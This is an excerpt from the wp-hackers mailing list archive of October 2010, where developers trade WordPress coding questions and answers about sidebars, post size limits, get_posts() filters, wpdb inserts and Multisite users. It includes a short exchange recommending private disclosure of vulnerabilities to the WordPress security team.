To provide some insight on how we function here, any email to
security/wordpress/org is quickly reviewed by a number of developers around
the world. If necessary, we will immediately get together in a private
communication channel to discuss the problem, and if further necessary, we
will devise, test, and commit a solution. We can get a new WordPress version
ready for download just as quickly.

Regards,
Nacin

From philip at frumph.net  Sat Oct  9 07:41:21 2010
From: philip at frumph.net (Philip M. Hofer (Frumph))
Date: Sat, 9 Oct 2010 00:41:21 -0700
Subject: [wp-hackers] Displaying a sidebar only if it contains widgets
In-Reply-To: <AANLkTi=gdaEmfubyBj=p13sfn9OTak5KoYtAb1MN12sB@mail.gmail.com>
References: <AANLkTi=n5e8w9YGww8zS1xNdyjZ0gbjqCcdTmKO4B8oe@mail.gmail.com><C20B9BD0169B497DAB4C4F42F78615A1@frumph.net><AANLkTikfQEo9w06Vwfwde6ixkgzBWrM_kPQXt32pX7N-@mail.gmail.com>
	<AANLkTi=gdaEmfubyBj=p13sfn9OTak5KoYtAb1MN12sB@mail.gmail.com>
Message-ID: <D1C8017EE4A946A7852655477A527585@frumph.net>

If when you register your sidebars you include an id => with it, you can 
utilize the ID instead of making core changes


----- Original Message ----- 
From: "David Morris" <dvmorris at gmail.com>
To: <wp-hackers at lists.automattic.com>
Sent: Friday, October 08, 2010 9:47 AM
Subject: Re: [wp-hackers] Displaying a sidebar only if it contains widgets


> Changing the first line in that function to this works:
>
>                global $wp_registered_sidebars;
> if ( is_int($index) ) {
> $index = "sidebar-$index";
> } else {
> $index = sanitize_title($index);
> foreach ( (array) $wp_registered_sidebars as $key => $value ) {
> if ( sanitize_title($value['name']) == $index ) {
> $index = $key;
> break;
> }
> }
> }
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 



From liste at srpski.biz  Sat Oct  9 12:06:04 2010
From: liste at srpski.biz (=?UTF-8?B?TWlsYW4gRGluacSH?=)
Date: Sat, 9 Oct 2010 14:06:04 +0200
Subject: [wp-hackers] Post size limited to 64KB
Message-ID: <AANLkTinLak2ecnXUVs6pwOC5OMSjgwjmx_X5Y6PFwnri@mail.gmail.com>

What settings can affect limit on size of post? On one installation, I can't
save posts larger than 64KB (around 10 000 words by lorem ipsum generator).
When larger posts are submitted, nothing is saved.

post_max_size is 30M and post_content field is LONGTEXT so that shouldn't be
a problem.

Thanks in advance.

From chris at clwill.com  Sat Oct  9 15:45:57 2010
From: chris at clwill.com (Chris Williams)
Date: Sat, 9 Oct 2010 11:45:57 -0400
Subject: [wp-hackers] Post size limited to 64KB
In-Reply-To: <AANLkTinLak2ecnXUVs6pwOC5OMSjgwjmx_X5Y6PFwnri@mail.gmail.com>
Message-ID: <C8D5DC45.639DB%chris@clwill.com>

Sounds like a storage engine limit.  In some implementations, myISAM and others, there are limits on the total row size.


________________________________
From: Milan Dini? <liste at srpski.biz>
Date: Sat, 9 Oct 2010 08:06:04 -0400
Subject: [wp-hackers] Post size limited to 64KB

What settings can affect limit on size of post? On one installation, I can't
save posts larger than 64KB (around 10 000 words by lorem ipsum generator).
When larger posts are submitted, nothing is saved.

post_max_size is 30M and post_content field is LONGTEXT so that shouldn't be
a problem.

From ron at vnetworx.net  Sat Oct  9 19:17:54 2010
From: ron at vnetworx.net (Ron Guerin)
Date: 9 Oct 2010 15:17:54 -0400
Subject: [wp-hackers] Is it possible to add fields to custom image header
	screens?
Message-ID: <4CB0BFE2.2020602@vnetworx.net>

A quick question...  I'm trying to add custom_image_header capabilities
to a theme.  The functionality allows the user to specify one color to
be used for all text over the image.  This theme uses three different
colors.  Blogname, blogtitle, and hover over blogname.  Is is possible
to easily add the two extra fields to the custom image header admin screens?

Also worth mentioning I suppose, that since visitors to my site have
asked for it, I'm looking to port a rotator I hacked into this theme's
header.php years ago into a plugin so others can use it.  It seems
logical to me that I should be hooking into the existing custom image
header screen, but again, I'd need to be able to modify the admin panel
to collect some additional information about the header images.

- Ron

From patrick_laverty at brown.edu  Sat Oct  9 19:49:41 2010
From: patrick_laverty at brown.edu (Patrick Laverty)
Date: Sat, 9 Oct 2010 15:49:41 -0400
Subject: [wp-hackers] WP 3.0.1 Multiple Sites -- SQL Injection
	Vulnerability
In-Reply-To: <4CAFC13B.1070404@intraffic.net>
References: <AANLkTi=Pg97uKnPyHnwdAxfMkUuEk91dCaqfsqoutoE=@mail.gmail.com>
	<AANLkTinB=aYt8LYvx0PqqAWdCPGvOyEm+P+FOv5E048t@mail.gmail.com>
	<4CAFC13B.1070404@intraffic.net>
Message-ID: <AANLkTinJfQhiLpSSuZNVsiR3Rrpa+aWMNpyPZEFDTzFm@mail.gmail.com>

>> In the future, I would have thought it were obvious, but:
>> Don't send potential vulnerabilities over a public mailing list or post it
>> to a public place.
>>
>> It should go through the core team at security at wordpress.org.
>>
>> See also: http://codex.wordpress.org/FAQ_Security.
>>
>
> Lame. If it were actually a security problem, individuals can react wayy
> faster than the core team to fix their sites.

Every individual WP blog admin is on this list?  All it takes is one
or two people with bad intentions to get hold of the vulnerability
before the owners do.  Do you want a knowledgeable cracker knowing
about a vulnerability in your blog immediately?  Maybe you're
traveling or just out to dinner when someone posts a vulnerability
here and a less responsible person reads it and somehow chooses your
blog to go after.

Andrew's right, the responsible thing to do is to report the possible
vulnerability to the vendor and give them a reasonable amount of time
to respond.  If they respond incorrectly or don't at all, then sure,
blast it out to the public.

From jane at automattic.com  Sat Oct  9 19:55:16 2010
From: jane at automattic.com (Jane Wells)
Date: Sat, 09 Oct 2010 15:55:16 -0400
Subject: [wp-hackers] WP 3.0.1 Multiple Sites -- SQL
	Injection	Vulnerability
In-Reply-To: <AANLkTinJfQhiLpSSuZNVsiR3Rrpa+aWMNpyPZEFDTzFm@mail.gmail.com>
References: <AANLkTi=Pg97uKnPyHnwdAxfMkUuEk91dCaqfsqoutoE=@mail.gmail.com>	<AANLkTinB=aYt8LYvx0PqqAWdCPGvOyEm+P+FOv5E048t@mail.gmail.com>	<4CAFC13B.1070404@intraffic.net>
	<AANLkTinJfQhiLpSSuZNVsiR3Rrpa+aWMNpyPZEFDTzFm@mail.gmail.com>
Message-ID: <4CB0C8A4.5070808@automattic.com>

On 10/9/10 3:49 PM, Patrick Laverty wrote:
>> Lame. If it were actually a security problem, individuals can react wayy
>> faster than the core team to fix their sites.

Well, except the core guys all get the security at wordpress.org emails 
immediately and if something's up they nab the others to help.

From frank at bueltge.de  Sat Oct  9 22:35:55 2010
From: frank at bueltge.de (Frank Bueltge)
Date: Sun, 10 Oct 2010 00:35:55 +0200
Subject: [wp-hackers] Stream, Feed of plugin-authors at wp.org?
Message-ID: <AANLkTi=L_i3D05swn0HZXV29kaT_JyA=Dz5t28=Ds4HK@mail.gmail.com>

Hello,

i use a stream or feed of all plugins from a plugin author, like on
http://profiles.wordpress.org/users/greenshady/
Is this possible?
I have check the feed-urls on the site, but no feed works.
Thanks for reply.
Frank

From ashishsainiashfame at gmail.com  Sun Oct 10 10:18:05 2010
From: ashishsainiashfame at gmail.com (Ashish Saini)
Date: Sun, 10 Oct 2010 15:48:05 +0530
Subject: [wp-hackers] Blog Owner in a Multisite
In-Reply-To: <AANLkTi=q0kMig5Stb59YHi_bFMh+qVqMZWoz3ggZ9_nG@mail.gmail.com>
References: <AANLkTikJrJSn6VhrLjzQv_XswZDPpW-fXQMJhY5r-Hdi@mail.gmail.com>
	<AANLkTinR5UTezyChWdbp3GEYjpreT3b9uLAggxtWawyn@mail.gmail.com>
	<AANLkTi=q0kMig5Stb59YHi_bFMh+qVqMZWoz3ggZ9_nG@mail.gmail.com>
Message-ID: <AANLkTimOEx5ohu+0TyTcuXo6PW_zn21rn80+rpY2NQSZ@mail.gmail.com>

Is there any function I can use or I just have to traverse the users array
checking their capabilities and relationship with each blog?

Thanks & Regards
Ashish Saini aka Ashfame
(Deserve Before You Desire)
Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
: http://twitter.com/ashfame


On Fri, Oct 8, 2010 at 10:13 PM, Ashish Saini
<ashishsainiashfame at gmail.com>wrote:

> Ah yes I was thinking its just user with capabilities.
> Lets say if someone sign up for a blog and then he will be the
> administrator and I want this user to be called as the blog owner.
>
>
> Thanks & Regards
> Ashish Saini aka Ashfame
> (Deserve Before You Desire)
> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
> Twitter : http://twitter.com/ashfame
>
>
> On Fri, Oct 8, 2010 at 10:03 PM, scribu <mail at scribu.net> wrote:
>
>> On Fri, Oct 8, 2010 at 3:09 PM, Ashish Saini
>> <ashishsainiashfame at gmail.com>wrote:
>>
>> > I have build up an array which holds the pageviews of each blog on
>> network
>> > with the blog id as they key.
>> > But now the question is how do I get to the blog owner of a particular
>> blog
>> > from the blog id so that I can aggregate the data for users?
>> >
>>
>> It really depends on how you define a blog owner. Is it the administrator
>> or
>> what?
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>

From mail at scribu.net  Sun Oct 10 12:31:02 2010
From: mail at scribu.net (scribu)
Date: Sun, 10 Oct 2010 15:31:02 +0300
Subject: [wp-hackers] Blog Owner in a Multisite
In-Reply-To: <AANLkTimOEx5ohu+0TyTcuXo6PW_zn21rn80+rpY2NQSZ@mail.gmail.com>
References: <AANLkTikJrJSn6VhrLjzQv_XswZDPpW-fXQMJhY5r-Hdi@mail.gmail.com>
	<AANLkTinR5UTezyChWdbp3GEYjpreT3b9uLAggxtWawyn@mail.gmail.com>
	<AANLkTi=q0kMig5Stb59YHi_bFMh+qVqMZWoz3ggZ9_nG@mail.gmail.com>
	<AANLkTimOEx5ohu+0TyTcuXo6PW_zn21rn80+rpY2NQSZ@mail.gmail.com>
Message-ID: <AANLkTi=U7hWxy3WLk7HcHtcOdama+V56cEuO8KF_ToS8@mail.gmail.com>

On Sun, Oct 10, 2010 at 1:18 PM, Ashish Saini
<ashishsainiashfame at gmail.com>wrote:

> Is there any function I can use or I just have to traverse the users array
> checking their capabilities and relationship with each blog?
>

You could try using get_users_of_blog().

In WP 3.1 there will be a more flexible get_users() function.

From kikizas at gmail.com  Sun Oct 10 13:20:21 2010
From: kikizas at gmail.com (Demetris Kikizas)
Date: Sun, 10 Oct 2010 16:20:21 +0300
Subject: [wp-hackers] Post size limited to 64KB
In-Reply-To: <AANLkTinLak2ecnXUVs6pwOC5OMSjgwjmx_X5Y6PFwnri@mail.gmail.com>
References: <AANLkTinLak2ecnXUVs6pwOC5OMSjgwjmx_X5Y6PFwnri@mail.gmail.com>
Message-ID: <AANLkTinmrrMkerj0P1L9wKz8SwvZT+2U3SBY80nciuCL@mail.gmail.com>

On Sat, Oct 9, 2010 at 3:06 PM, Milan Dini? <liste at srpski.biz> wrote:
> What settings can affect limit on size of post? On one installation, I can't
> save posts larger than 64KB (around 10 000 words by lorem ipsum generator).
> When larger posts are submitted, nothing is saved.
>
> post_max_size is 30M and post_content field is LONGTEXT so that shouldn't be
> a problem.
>
Does the installation have suhosin?  If yes, it could be
suhosin.post.max_value_length.

Default suhosin values: <http://www.hardened-php.net/suhosin/configuration.html>

Cheers,

Demetris
http://op111.net/code/wp-xo ? Extra Options, a practical plugin for WordPress

From ashishsainiashfame at gmail.com  Sun Oct 10 14:32:56 2010
From: ashishsainiashfame at gmail.com (Ashish Saini)
Date: Sun, 10 Oct 2010 20:02:56 +0530
Subject: [wp-hackers] Blog Owner in a Multisite
In-Reply-To: <AANLkTi=U7hWxy3WLk7HcHtcOdama+V56cEuO8KF_ToS8@mail.gmail.com>
References: <AANLkTikJrJSn6VhrLjzQv_XswZDPpW-fXQMJhY5r-Hdi@mail.gmail.com>
	<AANLkTinR5UTezyChWdbp3GEYjpreT3b9uLAggxtWawyn@mail.gmail.com>
	<AANLkTi=q0kMig5Stb59YHi_bFMh+qVqMZWoz3ggZ9_nG@mail.gmail.com>
	<AANLkTimOEx5ohu+0TyTcuXo6PW_zn21rn80+rpY2NQSZ@mail.gmail.com>
	<AANLkTi=U7hWxy3WLk7HcHtcOdama+V56cEuO8KF_ToS8@mail.gmail.com>
Message-ID: <AANLkTin0DdRehhpO=PpmhUxMNa-Tpte1iuMDrCmXM34c@mail.gmail.com>

Yeah! Did it by using get_users_of_blog() only. Thanks for the heads up for
the new upcoming function. :)

Thanks & Regards
Ashish Saini aka Ashfame
(Deserve Before You Desire)
Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
: http://twitter.com/ashfame


On Sun, Oct 10, 2010 at 6:01 PM, scribu <mail at scribu.net> wrote:

> On Sun, Oct 10, 2010 at 1:18 PM, Ashish Saini
> <ashishsainiashfame at gmail.com>wrote:
>
> > Is there any function I can use or I just have to traverse the users
> array
> > checking their capabilities and relationship with each blog?
> >
>
> You could try using get_users_of_blog().
>
> In WP 3.1 there will be a more flexible get_users() function.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From johnbillion+wp at gmail.com  Mon Oct 11 04:14:45 2010
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Mon, 11 Oct 2010 05:14:45 +0100
Subject: [wp-hackers] Filters on get_posts()
Message-ID: <AANLkTin24_tObEaHMPk=67ZWz63ea7QQpiu=rpm0ELqa@mail.gmail.com>

These days I find myself using multiple additional loops on the
majority of sites I build, as I'm sure many people on this list do.
The problem I'm now running into is the all-or-nothing filtering on
the get_posts() function which is used for additional loops.

By default, get_posts() sets the 'suppress_filters' parameter to
'true' meaning all the filters such as 'posts_where', 'posts_join' and
'posts_request' are not applied. This is desired behaviour, because
plugins that use these filters often filter the query based on the
global conditionals and the main WordPress query. If these filters
were applied to additional loops then we'd probably get unexpected
results.

So the problem is that with 'suppress_filters' set to 'true', we're
left with absolutely no filters on get_posts(). (Well, we have the
'posts_search' filter that affects the query if we're doing a search,
but that's it.)

I'd like to use get_posts() to get posts for my additional loop, but
I'd also like to filter the query string so I can join an additional
table (specifically, the translations lookup table from WPML [1] in
order to fetch translated posts). The only filter I can use is the
all-encompassing 'query' filter which applied to every single database
query.

In order to get around this I'm currently adding a filter to 'query'
before calling get_posts() and removing the filter immediately
afterwards. This is not good for my OCD. I also contemplated fetching
the posts and then fetching the translated posts in a second query,
but this isn't ideal either (especially as WPML is a bit heavy on
queries anyway).

Is there an argument here for adding a filter to the get_posts() query
string that's applied regardless of the 'suppress_filters' argument?
Is that just asking for trouble from plugins that end up incorrectly
using this filter? Or is there a better way of going about this?

Regards,
John

P.S. I'm aware of the 'pre_get_posts' action that affects the query
object in this function, but this only lets you control the query
arguments used to build the query string, not the query string itself.

[1] http://wpml.org/

From mikeschinkel at newclarity.net  Mon Oct 11 05:30:23 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 11 Oct 2010 01:30:23 -0400
Subject: [wp-hackers] Filters on get_posts()
In-Reply-To: <AANLkTin24_tObEaHMPk=67ZWz63ea7QQpiu=rpm0ELqa@mail.gmail.com>
References: <AANLkTin24_tObEaHMPk=67ZWz63ea7QQpiu=rpm0ELqa@mail.gmail.com>
Message-ID: <B3CD5895-2031-4082-8FF5-0DCC5ED88085@newclarity.net>

John,

I have run into pretty much the same issues.  That's why I wrote this ticket:

http://core.trac.wordpress.org/ticket/15063

The solution proposed in ticket may or may not be good but the problem it was trying to address is real.  

-Mike

On Oct 11, 2010, at 12:14 AM, John Blackbourn wrote:

> These days I find myself using multiple additional loops on the
> majority of sites I build, as I'm sure many people on this list do.
> The problem I'm now running into is the all-or-nothing filtering on
> the get_posts() function which is used for additional loops.
> 
> By default, get_posts() sets the 'suppress_filters' parameter to
> 'true' meaning all the filters such as 'posts_where', 'posts_join' and
> 'posts_request' are not applied. This is desired behaviour, because
> plugins that use these filters often filter the query based on the
> global conditionals and the main WordPress query. If these filters
> were applied to additional loops then we'd probably get unexpected
> results.
> 
> So the problem is that with 'suppress_filters' set to 'true', we're
> left with absolutely no filters on get_posts(). (Well, we have the
> 'posts_search' filter that affects the query if we're doing a search,
> but that's it.)
> 
> I'd like to use get_posts() to get posts for my additional loop, but
> I'd also like to filter the query string so I can join an additional
> table (specifically, the translations lookup table from WPML [1] in
> order to fetch translated posts). The only filter I can use is the
> all-encompassing 'query' filter which applied to every single database
> query.
> 
> In order to get around this I'm currently adding a filter to 'query'
> before calling get_posts() and removing the filter immediately
> afterwards. This is not good for my OCD. I also contemplated fetching
> the posts and then fetching the translated posts in a second query,
> but this isn't ideal either (especially as WPML is a bit heavy on
> queries anyway).
> 
> Is there an argument here for adding a filter to the get_posts() query
> string that's applied regardless of the 'suppress_filters' argument?
> Is that just asking for trouble from plugins that end up incorrectly
> using this filter? Or is there a better way of going about this?
> 
> Regards,
> John
> 
> P.S. I'm aware of the 'pre_get_posts' action that affects the query
> object in this function, but this only lets you control the query
> arguments used to build the query string, not the query string itself.
> 
> [1] http://wpml.org/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From haulyn at yahoo.com  Mon Oct 11 06:35:10 2010
From: haulyn at yahoo.com (Haulyn Jason)
Date: Sun, 10 Oct 2010 23:35:10 -0700 (PDT)
Subject: [wp-hackers] Should anybody help to me confirm a bug in wpdb?
Message-ID: <634140.75337.qm@web120210.mail.ne1.yahoo.com>

Hi, all:

I found an insert issue in wpdb, but I am not sure is it a bug.
I design an array and invoke wpdb to insert query.

$data =array( 'name' => $name,
'start_point' => $start_point,
'pagination_rule'=>$pagination_rule,
                 );
$data_format = array( '%s','%s','%s' ) ;
$wpdb->insert( $spider_rule_table_name,$data,$data_format);

I am sure $name, $start_point, $pagination_rule are all validated. The insert 
works well, but the column pagination_rule always got value '0'.

I echo $data['pagination_rule']after the insert, echo $wpdb->last_query,
I am sure $data['pagination_rule'] is validated, and the record stored. But the 
value for column 'pagination_rule' has changed to '0'.

Is it a bug? Or something others I missed?


 Thanks!



Location:Room 807,QiLuRuanJianDaSha Qilu Software Park
No. 1 Shunhua Rd High-Tech Development Zone
Jinan, China 250101
Website: http://www.haulynjason.net
Mobile: +86 15854103759


Haulyn Jason



      

From wp at andrewnacin.com  Mon Oct 11 06:50:15 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Mon, 11 Oct 2010 02:50:15 -0400
Subject: [wp-hackers] Should anybody help to me confirm a bug in wpdb?
In-Reply-To: <634140.75337.qm@web120210.mail.ne1.yahoo.com>
References: <634140.75337.qm@web120210.mail.ne1.yahoo.com>
Message-ID: <AANLkTi=Geyh6H38ODW+LQ2y3O6MUkC8LsBFS_ndUUjjF@mail.gmail.com>

On Mon, Oct 11, 2010 at 2:35 AM, Haulyn Jason <haulyn at yahoo.com> wrote:

> I echo $data['pagination_rule']after the insert, echo $wpdb->last_query,
> I am sure $data['pagination_rule'] is validated, and the record stored. But
> the
> value for column 'pagination_rule' has changed to '0'.
>
> Is it a bug? Or something others I missed?


You probably have an issue with your table structure that conflicts with the
data going in.

You can check $wpdb->queries (define the constant SAVEQUERIES as true in
wp-config.php) to see exactly the SQL that was run. Try running that
directly via the mysql console or something like phpMyAdmin, and I imagine
you will see the same issue.

Nacin

From haulyn at yahoo.com  Mon Oct 11 06:53:36 2010
From: haulyn at yahoo.com (Haulyn Jason)
Date: Sun, 10 Oct 2010 23:53:36 -0700 (PDT)
Subject: [wp-hackers] Should anybody help to me confirm a bug in wpdb?
In-Reply-To: <AANLkTi=Geyh6H38ODW+LQ2y3O6MUkC8LsBFS_ndUUjjF@mail.gmail.com>
References: <634140.75337.qm@web120210.mail.ne1.yahoo.com>
	<AANLkTi=Geyh6H38ODW+LQ2y3O6MUkC8LsBFS_ndUUjjF@mail.gmail.com>
Message-ID: <543335.41724.qm@web120206.mail.ne1.yahoo.com>

Thanks Andrew

I will test .
 Thanks!


http://www.vvthumb.com


Location:Room 807,QiLuRuanJianDaSha Qilu Software Park
No. 1 Shunhua Rd High-Tech Development Zone
Jinan, China 250101
Website: http://www.haulynjason.net
Mobile: +86 15854103759


Haulyn Jason




________________________________
From: Andrew Nacin <wp at andrewnacin.com>
To: wp-hackers at lists.automattic.com
Sent: Mon, October 11, 2010 2:50:15 PM
Subject: Re: [wp-hackers] Should anybody help to me confirm a bug in wpdb?

On Mon, Oct 11, 2010 at 2:35 AM, Haulyn Jason <haulyn at yahoo.com> wrote:

> I echo $data['pagination_rule']after the insert, echo $wpdb->last_query,
> I am sure $data['pagination_rule'] is validated, and the record stored. But
> the
> value for column 'pagination_rule' has changed to '0'.
>
> Is it a bug? Or something others I missed?


You probably have an issue with your table structure that conflicts with the
data going in.

You can check $wpdb->queries (define the constant SAVEQUERIES as true in
wp-config.php) to see exactly the SQL that was run. Try running that
directly via the mysql console or something like phpMyAdmin, and I imagine
you will see the same issue.

Nacin
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers



      

From mail at scribu.net  Mon Oct 11 09:45:47 2010
From: mail at scribu.net (scribu)
Date: Mon, 11 Oct 2010 12:45:47 +0300
Subject: [wp-hackers] Filters on get_posts()
In-Reply-To: <AANLkTin24_tObEaHMPk=67ZWz63ea7QQpiu=rpm0ELqa@mail.gmail.com>
References: <AANLkTin24_tObEaHMPk=67ZWz63ea7QQpiu=rpm0ELqa@mail.gmail.com>
Message-ID: <AANLkTi=js2ohz7xGqxSWNKzRaHNQd2Rko6uVAHLUJ7kY@mail.gmail.com>

On Mon, Oct 11, 2010 at 7:14 AM, John Blackbourn
<johnbillion+wp at gmail.com<johnbillion%2Bwp at gmail.com>
> wrote:

> I'd like to use get_posts() to get posts for my additional loop, but
> I'd also like to filter the query string so I can join an additional
> table (specifically, the translations lookup table from WPML [1] in
> order to fetch translated posts). The only filter I can use is the
> all-encompassing 'query' filter which applied to every single database
> query.
>

You can just pass suppress_filters => false to get_posts().

From harish.mlists at gmail.com  Mon Oct 11 10:48:55 2010
From: harish.mlists at gmail.com (Harish Narayanan)
Date: Mon, 11 Oct 2010 12:48:55 +0200
Subject: [wp-hackers] Links querying multiple tags
Message-ID: <4CB2EB97.3070106@gmail.com>

I noticed some time ago that links querying multiple tags (e.g.
site.org/tag/foo,bar/) stopped working on my site which runs WordPress
trunk.

I think the following sort of changes introduced the issue, but I am not
sure.

http://core.trac.wordpress.org/changeset?old_path=%2Ftrunk&old=15750&new_path=%2Ftrunk&new=15772#file12

Before I go ahead and file a ticket, I wanted to make sure if

1. Others were seeing this behaviour.
2. The syntax for generating a page with multiple tags just hadn't
changed to something else.

Thanks,
Harish

From casey.bisson at gmail.com  Mon Oct 11 12:02:28 2010
From: casey.bisson at gmail.com (Casey Bisson)
Date: Mon, 11 Oct 2010 05:02:28 -0700
Subject: [wp-hackers] Filters on get_posts()
In-Reply-To: <AANLkTin24_tObEaHMPk=67ZWz63ea7QQpiu=rpm0ELqa@mail.gmail.com>
References: <AANLkTin24_tObEaHMPk=67ZWz63ea7QQpiu=rpm0ELqa@mail.gmail.com>
Message-ID: <D494878C-3CC6-4BF6-945D-421EA4CCCFB8@gmail.com>


John,

I think your approach here is good. That is, there's no reason a filter has to be blindly activated as WP is instantiated, and the globally applied.

Filters such as you describe should look at the context of the query and optionally activate themselves. Then immediately deactivate once their work is done. The parse-query and pre-get-posts actions are good places to apply filters, then simply remove_filter() as you run them. 

If you're running multiple loops, you can do yourself a favor by calling do_action('my_loop_name') just before calling wp_query(), as that will give you an opportunity to set whatever filters you want based on that specific loop/query. 

--Casey

http://MaisonBisson.com

On Oct 10, 2010, at 9:14 PM, John Blackbourn <johnbillion+wp at gmail.com> wrote:

> In order to get around this I'm currently adding a filter to 'query'
> before calling get_posts() and removing the filter immediately
> afterwards. This is not good for my OCD. I also contemplated fetching
> the posts and then fetching the translated posts in a second query,
> but this isn't ideal either (especially as WPML is a bit heavy on
> queries anyway).

From mail at scribu.net  Mon Oct 11 12:20:21 2010
From: mail at scribu.net (scribu)
Date: Mon, 11 Oct 2010 15:20:21 +0300
Subject: [wp-hackers] Links querying multiple tags
In-Reply-To: <4CB2EB97.3070106@gmail.com>
References: <4CB2EB97.3070106@gmail.com>
Message-ID: <AANLkTim_h5BnhS=WzuTw0kJp_2_uQWf0wT=-PHC698Zt@mail.gmail.com>

On Mon, Oct 11, 2010 at 1:48 PM, Harish Narayanan
<harish.mlists at gmail.com>wrote:

> I noticed some time ago that links querying multiple tags (e.g.
> site.org/tag/foo,bar/) stopped working on my site which runs WordPress
> trunk.
>

Indeed it was a bug. Should be fixed now:

http://core.trac.wordpress.org/changeset/15773

From harish.mlists at gmail.com  Mon Oct 11 12:32:55 2010
From: harish.mlists at gmail.com (Harish Narayanan)
Date: Mon, 11 Oct 2010 14:32:55 +0200
Subject: [wp-hackers] Links querying multiple tags
In-Reply-To: <AANLkTim_h5BnhS=WzuTw0kJp_2_uQWf0wT=-PHC698Zt@mail.gmail.com>
References: <4CB2EB97.3070106@gmail.com>
	<AANLkTim_h5BnhS=WzuTw0kJp_2_uQWf0wT=-PHC698Zt@mail.gmail.com>
Message-ID: <4CB303F7.5060901@gmail.com>

On 10/11/10 2:20 PM, scribu wrote:
> On Mon, Oct 11, 2010 at 1:48 PM, Harish Narayanan
> <harish.mlists at gmail.com>wrote:
> 
>> I noticed some time ago that links querying multiple tags (e.g.
>> site.org/tag/foo,bar/) stopped working on my site which runs WordPress
>> trunk.
>>
> 
> Indeed it was a bug. Should be fixed now:
> 
> http://core.trac.wordpress.org/changeset/15773

Thank you, this fixed the problem for me.

Harish

From gaarai at gaarai.com  Mon Oct 11 13:47:54 2010
From: gaarai at gaarai.com (Chris Jean)
Date: Mon, 11 Oct 2010 08:47:54 -0500
Subject: [wp-hackers] How to use formand link in plugin development?
In-Reply-To: <367138.73819.qm@web120220.mail.ne1.yahoo.com>
References: <OF2E775AB5.350F904A-ONC12577B5.003147AB-C12577B5.00318DB8@notes.edfgdf.fr>	<324027.23356.qm@web120210.mail.ne1.yahoo.com>	<181895.41125.qm@web120212.mail.ne1.yahoo.com>	<4CADD246.7050307@gaarai.com>
	<367138.73819.qm@web120220.mail.ne1.yahoo.com>
Message-ID: <4CB3158A.3090903@gaarai.com>

Very sorry for not getting back to you sooner.

You can see a solid example of putting together a full admin editor page 
in this plugin <http://chrisjean.com/wp-code-examples.zip>.

The plugin is an early version of a code sample plugin that I plan to 
put on the plugin repository. The section specific to what you want can 
be found in the sample-admin-editor.php file's show_form function 
starting at line 233.

Chris Jean (AKA gaarai&  chrisbliss18)
Coder for http://ithemes.com/
http://gaarai.com/
@chrisjean


On 10/07/2010 08:18 PM, Haulyn Jason wrote:
> Hi, Chris,
>
> Thanks for your reply, my script is for admin panel, just for administrator.
>   Thanks!
>
>
> http://www.vvthumb.com
>
>
> Location:Room 807,QiLuRuanJianDaSha Qilu Software Park
> No. 1 Shunhua Rd High-Tech Development Zone
> Jinan, China 250101
> Website: http://www.haulynjason.net
> Mobile: +86 15854103759
>
>
> Haulyn Jason
>
>
>
>
> ________________________________
> From: Chris Jean<gaarai at gaarai.com>
> To: wp-hackers at lists.automattic.com
> Sent: Thu, October 7, 2010 9:59:34 PM
> Subject: Re: [wp-hackers] How to use formand link in plugin development?
>
> In my humble opinion, you are going about solving this the wrong way around. You
> shouldn't have the form send data directly to your script. Rather, you should
> have a form submission handler in your code that runs inside WordPress.
>
> To give you an example of this, I'd like to know if you have this form on the
> back-end (admin form) or front-end (for a site visitor to fill out).
>
> Chris Jean (AKA gaarai&   chrisbliss18)
> Coder for http://ithemes.com/
> http://gaarai.com/
> @chrisjean
>
>
> On 10/07/2010 08:31 AM, Haulyn Jason wrote:
>    
>> I solve it now, but hard code. Maybe there is a better way?
>>    Thanks!
>>
>>      
>>> I am developing a plugin, I design a form, but I do not know the form action
>>> rule. my form script is slackissspider.php, my logic is
>>> slackissspider-action.php. They are in one folder( the plugin folder). Now I
>>> can not find any reference to write<form action="??">, the related pathdoes not
>>> work.
>>>
>>> Any solutions or reference is very useful, Thanks very much.
>>>
>>> Haulyn Jason
>>>        
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>    

From dgs at riskiii.com  Mon Oct 11 14:23:19 2010
From: dgs at riskiii.com (Danny G Smith)
Date: Mon, 11 Oct 2010 09:23:19 -0500
Subject: [wp-hackers] How to use formand link in plugin development?
In-Reply-To: <4CB3158A.3090903@gaarai.com>
References: <OF2E775AB5.350F904A-ONC12577B5.003147AB-C12577B5.00318DB8@notes.edfgdf.fr>	<324027.23356.qm@web120210.mail.ne1.yahoo.com>	<181895.41125.qm@web120212.mail.ne1.yahoo.com>	<4CADD246.7050307@gaarai.com>
	<367138.73819.qm@web120220.mail.ne1.yahoo.com>
	<4CB3158A.3090903@gaarai.com>
Message-ID: <D3E468A2-978B-4CF0-953B-58C2F1A469D0@riskiii.com>

I am not the original poster, but I would like to thank you for this code.  It is very nicely written and documented, and will be great for things I need to do soon.  Thanks, Chris!

thanks,
Danny

On Oct 11, 2010, at 8:47 AM, Chris Jean wrote:

> Very sorry for not getting back to you sooner.
> 
> You can see a solid example of putting together a full admin editor page in this plugin <http://chrisjean.com/wp-code-examples.zip>.
> 
> The plugin is an early version of a code sample plugin that I plan to put on the plugin repository. The section specific to what you want can be found in the sample-admin-editor.php file's show_form function starting at line 233.
> 
> Chris Jean (AKA gaarai&  chrisbliss18)
> Coder for http://ithemes.com/
> http://gaarai.com/
> @chrisjean
> 
> 
> On 10/07/2010 08:18 PM, Haulyn Jason wrote:
>> Hi, Chris,
>> 
